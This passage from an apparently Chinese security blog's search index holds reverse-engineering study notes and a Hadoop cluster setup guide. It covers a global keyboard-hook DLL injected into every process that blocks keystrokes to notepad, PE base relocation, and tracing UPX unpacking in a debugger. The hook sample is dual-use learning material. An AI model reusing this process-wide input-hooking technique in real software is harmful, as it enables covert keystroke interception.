= {0,}; char *p = NULL; if( nCode \u003e= 0 ) { // bit 31 : 0 =\u003e press, 1 =\u003e release if( !(lParam \u0026 0x80000000) ) //释放键盘按键时 { GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, '\\\\'); //比较当前进程名称是否为notepad.exe，成立则消息不传递给应用程 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; } } //如果不是notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) void HookStart() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if( g_hHook ) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } #ifdef __cplusplus } #endif 总体上代码相对简单，调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KetyboardProc()添加到键盘钩链。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"3. 代码执行流程分析 安装好键盘钩子后，无论在哪个进程中，只要发生了键盘输入事件，OS就会强制将KeyHook.dll注入到进程中，加载了KeyHook.dll的进程，发生键盘事件时会首先调用执行KeyHook.KetyboardProc()。 KetyboardProc()函数中发生键盘输入事件时，会比较当前进程的名称与“notepad.exe”是否相同，相同返回1，终止KetyboardProc()函数，意味着截获并删除了消息，这样键盘消息就不会传递到notepad.exe程序的消息队列。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"五、调试 使用OD打开HookMain.exe文件： ###1. 查找核心代码 我们关心的是核心的键盘钩取部分的代码，如何查找核心代码？ 逐步跟踪（除非迫不得已！） 检索相关API 检索相关字符串 我们已经知道程序的功能，会在控制台显示字符串“press ‘q’ to quit!”，所以先检查程序导入的字符串（Search for -All referencen text strings）： 地址40104d处引用了要查找的字符串，双击跳转： 来到main函数处。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:5:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"2. 调试main函数 在401000处下断，开始调试，了解main函数中主要的代码流。401006地址处调用LoadLibraryA(Keyhook.dll)，然后由40104b地址处的CALL EBX指令调用KeyHook.HookStart()函数。跟进查看： 这里的代码是被加载到HookMain.exe进程中的KeyHook.dll的HookStart()函数，第一句就是调用SetWindowsHookExW()函数，在进行参数入栈操作后，我们可以在栈中看到函数的4个参数值。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:5:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"参考 《逆向工程核心原理》 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:6:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-04","objectID":"/2020/03/RE4B-6/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"PE文件格式详细解析（六）– 基址重定位表（Base Relocation Table） ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"一、PE重定位 向进程的虚拟内存加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处。如果是加载的DLL（SYS）文件，且在ImageBase位置处已经加载了DLL（SYS）文件，那么PE装载器就会将其加载到其他未被占用的空间。此时就会发生基址重定位。 使用SDK或VC++创建PE文件，EXE默认的ImageBase为00400000，DLL默认的ImageBase为10000000，使用DDK创建的SYS文件默认的ImageBase为10000。 创建好进程后，因为EXE文件会首先加载进内存，所以EXE文件中无需考虑基址重定位问题。但是需要考虑ASLR（地址随机化）。对于各OS的主要系统DLL，微软会根据不同版本分别赋予不同的ImageBase地址，例如同一系统的kernel32.dll和user32.dll等会被加载到自身固有的ImageBase，所以系统的DLL实际上也不会发生重定位问题。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"二、PE重定位时发生了什么 以下以书上程序为例（书上是以exe文件举例，纯粹是举例，实际环境中基址重定位多发生在DLL文件中）。 基本信息： 如下图所示，其ImageBase为01000000 使用OD运行，观察内存： 下图是程序的EP代码部分，因为ASLR的原因，程序被加载到00270000处。 从图中可以看出，红框内进程的内存地址是以硬编码的方式存在的，地址2710fc、271100是.text节区的IAT区域，地址27c0a4是.data节区的全局变量。因为ASLR的存在，每次在OD中重启程序，地址值就会随加载地址的不同而发生变化，这种使硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位。 将以上两个图进行对比整理，数据如下表所示： 文件（ImageBase：01000000） 进程内存（加载地址：00270000） 0100010fc 002710fc 01001100 00271100 0100c0a4 0028c0a4 即：因为程序无法预测会被加载到哪个地址，所以记录硬编码地址时以ImageBase为准；在程序运行书简，经过PE重定位，这些地址全部以加载地址为基准进行变换，从而保证程序的正常运行。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"三、PE重定位操作原理 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"1. 基本操作原理 在应用程序中查找硬编码的地址位置 读取数值后，减去ImageBase（VA-\u003eRVA） 加上实际加载地址（RVA-\u003eVA） 上面三个步骤即可完成PE重定位，其中最关键的是查找硬编码地址的位置，查找过程中会使用到PE文件内部的Relocation Tables（重定位表），它记录了硬编码地址便宜，是在PE文件构建中的编译/链接阶段提供的。通过重定位表查找，本质上就是根据PE头的“基址重定位表”项进行的查找。 如上图所示，红框内的硬编码的地址都需要经过重定位再加载到内存中。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"2. 基址重定位表 位于PE头的DataDirectory数组的第六个元素，索引为5.如下图所示： 上图中的基址重定位表的RVA为2f000，查看该地址处内容： ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"3. IMAGE_BASE_RELOCATION结构体 上图中详细罗列了硬编码地址的偏移，读取该表就可以获得准确的硬编码地址偏移。基址重定位表是IMAGE_BASE_RELOCATION结构体数组。 其定义如下： typedefine struct _IMAGE_BASE_RELOCATION{ DWORD VirtualAddress; //RVA值 DOWRD SizeOfBlock; //重定位块的大小 //WORD TypeOffset[1]; //以注释形式存在，非结构体成员，表示在该结构体下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。 }IMAGE_BASE_RELOCATION; tydefine IMAGE_BASE_RELOCATION UNALIGEND * PIMAGE_BASE_RELOCATION; ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"4. 基地址重定位表的分析方法 下表列出上图中基址重定位表的部分内容： RVA 数据 注释 2f000 00001000 VirtualAddress 2f004 00000150 SizeOfBlock 2f008 3420 TypeOffset 2f00a 342d TypeOffset 2f00c 3436 TypeOffset 以VirtualAddress=00001000，SizeOfBlock=00000150，TypeOffset=3420为例。 TypeOffset值为2个字节，由4位的Type与12位的Offset合成： 类型（4位） 偏移（12位） 3 420 高4位指定Type，PE文件中常见的值为3（IMAGE_REL_BASED_HIGHLOW），64位的PE文件中常见值为A（IMAGE_REL_BASED_DIR64）。低12位位真正位移（最大地址为1000），改位移是基于VirtualAddress的位移，所以程序中硬编码地址的偏移使用以下公式进行计算： VirtualAddress(1000) + Offset(420) = 1420(RVA) 下面我们在OD中看一下RVA 1420处是否实际存在要执行PE重定位操作的硬编码地址： 程序加载的基地址为270000，所以在271420处可以看到IAT的地址（VA，2710c4）。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:4","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"5. 总结流程 查找程序中硬编码地址的位置（通过基址重定位表查找） 可以看到，RVA 1420处存在着程序的硬编码地址010010c4 读取数值后，减去ImageBase值： 010010c4 - 01000000 = 000010c4 加上实际加载地址 000010c4 + 00270000=002710c4 对于程序内硬编码的地址，PE装载器都做如上的处理，根据实际加载的内存地址修正后，将得到的值覆盖到同一位置上。对一个IMAGE_BASE_RELOCATION结构体的所有TypeOffset都做如上处理，且对RVA 1000～2000地址区域对应的所有硬编码地址都要进行PE重定位处理。如果TypeOffset值为0，说明一个IMAGE_BASE_RELOCATION结构体结束。至此，完成重定位流程。 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:3:5","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Tech"],"content":"四、参考 《逆向工程核心原理》 ","date":"2020-03-04","objectID":"/2020/03/RE4B-6/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.6","uri":"/2020/03/RE4B-6/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-04","objectID":"/2020/03/Hadoop6/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(六)–分布式环境搭建 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"服务器功能规划 zy1 zy2 zy3 NameNode ResourceManage DataNode DataNode DataNode NodeManager NodeManager NodeManager HistoryServer SecondaryNameNode ip：10.251.0.144 ip：10.251.0.150 ip：10.251.0.151 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"一、解压Hadoop目录 wget http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-2.8.5/hadoop-2.8.5.tar.gz tar -zxvf hadoop-2.8.5.tar.gz -C /opt/bigdata mv hadoop-2.8.5 hadoop 在伪分布式安装时，已经配置了hadoop的环境变量，无需再重复配置了。验证： echo $HADOOP_HOME ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"二、配置 hadoop-env.sh、mapred-env.sh yarn-env.sh JAVA_HOME参数 比如修改hadoop-env.sh： vim ${HADOOP_HOME}/etc/hadoop/hadoop-env.sh 修改JAVA_HOME参数为： export JAVA_HOME=/usr/lib/jvm/java ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"三、各主要配置文件配置 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. 配置core-site.xml vim ${HADOOP_HOME}/etc/hadoop/core-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://zy1:9000\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003ehadoop.tmp.dir\u003c/name\u003e \u003cvalue\u003e/opt/bigdata/data/hadoop\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/name\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/data\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e fs.defaultFS为NameNode的地址。 hadoop.tmp.dir：为hadoop临时目录的地址，默认情况下，NameNode和DataNode的数据文件都会存在这个目录下的对应子目录下（但是上面我们通过dfs.datanode.data.dir，和dfs.namenode.data.dir指定了）。应该保证此目录是存在的，如果不存在，先创建； dfs.namenode.name.dir：指定目录来供namenode存储永久性的文件系统元数据（如果指定多个路径，使用\",“隔开）。这些元数据文件会同时备份在所有指定的目录上，通常情况下，通过配置dfs.namenode.data.dir可以将namenode元数据写到一两个本地磁盘和一个远程磁盘（例如NFS挂载目录）之中。这样的话，即使本地磁盘发生故障，甚至整个namenode发生故障，都可以恢复数据文件并重新构成新的namenode（辅助namenode只是定期保存namenode的检查点，不维护namenode的最新备份）； dfs.datanode.data.dir：可以设定datanode存储数据块的目录列表，上面提到dfs.namenode.name.dir描述一系列目录，其目的是为了支持namenode进行冗余备份。虽然dfs.datanode.data.dir也描述了一系列目录，但是其目的是使datanode循环的在各个目录中写数据。因此，为了提高性能，最好分别为各个本地磁盘指定一个存储目录，这样一来，数据块跨磁盘分布，针对不同的数据块的读操作可以并发执行，从而提高读取速度。 mkdir /opt/bigdata/data/hadoop ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 配置hdfs-site.xml vim ${HADOOP_HOME}/etc/hadoop/hdfs-site.xml 添加以下内容： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.secondary.http-address\u003c/name\u003e \u003cvalue\u003ezy3:50090\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.client.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e dfs.namenode.secondary.http-address：是指定secondaryNameNode的http访问地址和端口号，因为在规划中，我们将zy3规划为SecondaryNameNode服务器。所以这里设置为：zy3:50090。 dfs.replication配置的是HDFS存储时的备份数量，这里设置为2； fs.client.use.datanode.hostname：是否客户端应该使用DN的HostName，在连接DN时，默认是使用IP；（必须设置为true） dfs.datanode.use.datanode.hostname：是否DN应该使用HostName连接其它DN，在数据传输时。默认是是IP。（必须设置为true） ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"3. 配置masters、slaves cd hadoop vim etc/hadoop/masters vim etc/hadoop/slaves masters修改为：zy1 slavers：zy2 ​ zy3 masters文件是指定HDFS的主节点，zy1特有；slaves文件是指定HDFS上有哪些DataNode节点。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"4. 配置mapred-site.xml 复制mapred-site.xml.template配置模板文件生成mapred-site.xml： cp etc/hadoop/mapred-site.xml.template etc/hadoop/mapred-site.xml 添加配置： vim etc/hadoop/mapred-site.xml 修改内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.address\u003c/name\u003e \u003cvalue\u003ezy1:10020\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.webapp.address\u003c/name\u003e \u003cvalue\u003ezy1:19888\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e mapreduce.framework.name设置mapreduce任务运行在yarn上； mapreduce.jobhistory.address是设置mapreduce的历史服务器安装在zy1机器上； mapreduce.jobhistory.webapp.address是设置历史服务器的web页面地址和端口号。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"5. 配置yarn-site.xml vim etc/hadoop/yarn-site.xml 添加内容如下： \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003eyarn.nodemanager.aux-services\u003c/name\u003e \u003cvalue\u003emapreduce_shuffle\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ezy2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation-enable\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation.retain-seconds\u003c/name\u003e \u003cvalue\u003e106800\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e yarn.nodemanager.aux-services配置了yarn的默认混洗方式，选择为mapreduce的默认混洗算法； yarn.resourcemanager.hostname指定了Resourcemanager运行在zy2节点上； yarn.log-aggregation-enable是配置是否启用日志聚集功能； yarn.log-aggregation.retain-seconds是配置聚集的日志在HDFS上最多保存多长时间； ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:4:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"四、设置SSH无密码登录及文件分发 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. SSH无密码登录配置 Hadoop集群中的各个机器间会相互地通过SSH访问，所以要配置各个机器间的SSH为无密码登录的。 在zy1上生成公钥： ssh-keygen -t rsa 在当前用户的Home目录下的.ssh目录中会生成公钥文件（id_rsa.pub）和私钥文件（id_rsa）。 分发公钥： ssh-copy-id zy1 ssh-copy-id zy2 ssh-copy-id zy3 设置zy2、zy3到其他机器的无密钥登录：同样的在zy2、zy3上生成公钥和私钥后，将公钥分发到三台机器上。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 分发Hadoop文件 通过Scp分发： cd /opt/bigdata scp -r /opt/bigdata/hadoop/ zy2:/opt/bigdata scp -r /opt/bigdata/hadoop/ zy3:/opt/bigdata 在每个节点下执行： mkdir /opt/bigdata/data/hadoop ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:5:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"五、格式化和启动运行 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"1. 格式NameNode 在使用hadoop之前，全新的HDFS安装需要进行格式化。通过创建存储目录和初始化版本的namenode持久数据结构，格式化将创建一个空的文件系统。 在NameNode机器上(节点zy1)执行格式化： hdfs namenode -format 注意：如果需要重新格式化NameNode，需要先将原来NameNode和DataNode下的文件全部删除，不然会报错，NameNode和DataNode所在目录是在core-site.xml中hadoop.tmp.dir、dfs.namenode.name.dir、dfs.datanode.data.dir属性配置的。 每次格式化，默认创建一个集群ID，并写入NameNode的VERSION文件中（VERSION文件所在目录为dfs/name/current ）。 此时并没有将集群ID写入DataNode的VERSION之中，由于namenode管理所有的文件系统的元数据，datanode可以动态加入或离开集群，所以初始的格式化过程不涉及datanode。 只有在启动HDFS时，才会将ID写入DataNode的VERSION之中。如果我们重新格式化HDFS，重新格式化时，默认会生成一个新的集群ID，如果不删除原来的数据目录，会导致namenode中的VERSION文件中是新的集群ID,而DataNode中是旧的集群ID，不一致时会报错。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"2. 启动HDFS 在zy1节点运行以下命令： start-dfs.sh ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"3. 启动YARN start-yarn.sh 在zy2上启动ResourceManager： yarn-daemon.sh start resourcemanager ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"4. 启动日志服务器 规划为在zy1服务器上运行MapReduce日志服务，所以要在zy1上启动： mr-jobhistory-daemon.sh start historyserver ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"5. 查看HDFS Web页面 hdfs的Web客户端端口号是50070，通过http://zy1:50070/可以查看。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"6. 查看YARN Web 页面 YARN的Web客户端端口号是8088，由于ResourceManager设置在zy2节点上，因此通过http://zy2:8088/查看当前执行的job。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:6","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"7. hadoop配置信息 Hadoop更多端口相关的配置参考：hadoop端口号配置信息、ResourceManager相关配置参数。 更多Hadoop的参数配置可以惨开：hadoop 参数配置。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:7","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"8. 关闭hadoop 在各个节点下运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:8","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"9. 重新格式化和启动 在每个节点运行如下命令： cd /opt/bigdata/hadoop sbin/stop-all.sh rm -rf logs/* rm -rf ../data/hadoop/* 在namenode节点(zy1)运行： hdfs namenode -format 然后在每个节点运行相应启动hadoop的命令。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:6:9","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"六、错误排查 如果hadoop启动出现出错，查看日志，日志位于hadoop安装路径下的logs目录下。 ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:7:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Vuln"],"content":"七、参考文章 https://blog.csdn.net/hliq5399/article/details/78193113 https://www.cnblogs.com/zyly/p/11209286.html#_label4_16 https://blog.csdn.net/bqw18744018044/article/details/79103931 https://blog.csdn.net/henrrywan/article/details/86432912?depth_1-utm_source=distribute.pc_relevant.none-task\u0026utm_source=distribute.pc_relevant.none-task https://hadoop.apache.org/docs/ ","date":"2020-03-04","objectID":"/2020/03/Hadoop6/:8:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(六)--分布式环境搭建","uri":"/2020/03/Hadoop6/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-03","objectID":"/2020/03/RE4B-5/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"PE文件格式详细解析（五）– 调试UPX压缩的notepad程序 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"一、未经过UPX压缩的notepad的EP代码 首先看一下未经过UPX压缩的notepad的相关信息： PEView查看基本结构信息： RVA = 1000，且SizeOfRawData是有大小的。 OD查看EP代码： 首先简单看一下汇编代码，程序在010073b2处调用kernel32.dll中的GetModuleHandleA()函数，然后可以得到程序的ImageBase，存放在EAX中： 然后，进行PE文件格式的验证，比较MZ和PE签名。 以上代码可以简单记录一下，方便后续与经过UPX压缩的程序进行比较。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"二、经过UPX压缩的notepad_upx.exe的EP代码 PEView查看下信息（上一节已经介绍过）： 第一个图为第一个节区UPX0的信息，第二个图为第二个节区UPX1的信息。 OD进行EP代码查看： 可以发现经过UPX压缩的EP代码发生了明显的改变，入口地址变为了01014410，该地址其实为第二个节区UPX1的末尾地址（使用PEView可以确认），实际压缩的源代码位于该地址的上方。 然后我们看一下代码开始部分： 01014410 60 pushad 01014411 BE 00000101 mov esi, notepad_.01010000 01014416 8DBE 0010FFFF lea esi, dword ptr ds:[esi-0xf000] 首先看第一句，pushad，其主要作用将eax～edi寄存器的值保存到栈中： 结合上面的图，发现在执行完pushad指令后，eax～edi的值确实都保存到了栈中。 后面两句分别把第二个节区的起始地址（01010000）与第一个节区的起始地址（01001000）存放到esi与edi寄存器中。UPX文件第一节区仅存在于内存中，该处即是解压缩后保存源文件代码的地方。 需要注意的是，在调试时同时设置esi与edi，大概率是发生了esi所指缓冲区到edi所指缓冲区的内存复制。此时从Source（esi）读取数据，解压缩后保存到Destination（edi）。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"三、跟踪UPX文件 掌握基本信息后，开始正式跟踪UPX文件，需要遵循的一个原则是，遇到循环（loop）时，先了解作用再跳出，然后决定是否需要再循环内部单步调试。 备注：此处开始使用书上的例子，因为我个人的反汇编的代码会跟书上不一致，不建议新手使用。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"1. 第一个循环 在EP代码处执行Animate Over（Ctrl+F8）命令，开始跟踪代码： 跟踪到这里后发现第一个关键循环，涉及到edi的反复变化，循环次数为36b，主要作用是从edx（01001000）中读取一个字节写入edi（01001001）。edi所指的地址即是第一个节区UPX0的起始地址（PEView已经验证过），仅存于内存中，数据全部被填充为NULL，主要是清空区域，防止有其他数据。这样的循环我们跳出即可，在010153e6处下断点，然后F9跳出。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"2. 第二个循环 在断点处继续Animate Over跟踪代码，遇到下图的循环结构： 该村换是正式的解压缩循环。 先从esi所指的第二个节区（UPX1）地址中依次读取数据，然后经过一系列运算解压缩后，将数据放入edi所指的第一个节区（UPX0）地址。关键指令解释： 0101534B . 8807 mov byte ptr ds:[edi],al 0101534D . 47 inc edi ; notepad_.0100136C ... 010153E0 . 8807 mov byte ptr ds:[edi],al 010153E2 . 47 inc edi ; notepad_.0100136C ... 010153F1 . 8907 mov dword ptr ds:[edi],eax 010153F3 . 83C7 04 add edi,0x4 * 解压缩后的数据放在AL（eax）中，edi指向第一个节区的地址 在01015402地址处下断，跳出循环（暂不考虑内部压缩过程）。在转储窗口查看解压缩后的代码： ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes 